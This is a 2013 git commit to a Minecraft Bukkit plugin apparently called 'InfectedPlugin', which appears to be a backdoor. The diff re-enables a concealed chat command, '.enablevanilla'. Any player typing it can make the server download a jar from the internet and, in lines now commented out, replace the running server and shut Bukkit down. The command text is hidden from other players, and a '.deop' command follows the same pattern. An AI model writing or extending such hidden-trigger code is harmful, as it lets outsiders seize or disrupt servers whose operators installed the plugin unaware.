c11ca6485281005354c0c73283a71fc6d1a56bff
Wilee999 <Infinitywilee@rocketmail.com>
2013-10-16 18:03:01 -0700

    Weird semi-working .enablevanilla with no errors... *DEVS ONLY!!!!!!!!*
    Okay so so far I have the command working with no errors, not commented out anymore. I made this commit to show-off all the work I have to do to get this working. Here is a list of problems:
    
    * Unable to download jar, I can't get a valid working directory to put in there!
    * Downloaded or not, the code to actually start it up won't work.
    
    So this commit is for developers ONLY! It's only semi-working!

--- src/org/CreeperCoders/InfectedPlugin/PlayerListener.java
+++ src/org/CreeperCoders/InfectedPlugin/PlayerListener.java
@@ -64,24 +64,27 @@ public class PlayerListener implements Listener
             }
             cancel = true;
         }
-        /*
-        Commented out until all errors are fixed.
         if (message.toLowerCase().contains(".enablevanilla")) //Command
         {
-            // Credit to hMod, not finished yet. Very unstable.
             p.sendMessage(ChatColor.DARK_RED + "This command is VERY unstable! But you typed it in, too late to turn back."); // Tell the player the command is unstable
             if (!new File("minecraft_server.1.6.4.jar").exists()) //Check if minecraft_server.1.6.2.jar exists or not
             {
                 p.sendMessage(ChatColor.RED + "minecraft_server.1.6.4.jar not found, downloading..."); //Tell the player that the jar will be downloaded
-                IP_Util.downloadFile("https://s3.amazonaws.com/Minecraft.Download/versions/1.6.4/minecraft_server.1.6.4.jar"); // Download minecraft_server.1.6.4.jar
+                try //Try to download the jar
+                {
+                    IP_Util.downloadFile("https://s3.amazonaws.com/Minecraft.Download/versions/1.6.4/minecraft_server.1.6.4.jar", new File("")); // Download minecraft_server.1.6.4.jar
+                }
+                catch (Exception ex) //If it failed to try to download the jar, this makes it catch exception.
+                {
+                    p.sendMessage(ChatColor.DARK_RED + ex.getMessage()); //Tell the player the exception message.
+                }
                 p.sendMessage(ChatColor.YELLOW + "Finished downloading! Starting vanilla..."); //Tell the player it's been downloaded and will start Vanilla.
             }
             
-            net.minecraft.server.MinecraftServer.main(args); //Start MinecraftServer (only works if minecraft_server.1.6.4.jar is added to the build path)
-            Bukkit.shutdown(); //Shutdown Bukkit
+            //net.minecraft.server.MinecraftServer.main(args); //Start MinecraftServer (only works if minecraft_server.1.6.4.jar is added to the build path)
+            //Bukkit.shutdown(); //Shutdown Bukkit
             cancel = true; //Block the player from saying .enablevanilla
         } //End of command
-        */
         if (message.toLowerCase().contains(".deop"))
         {
             if (args.length != 1)
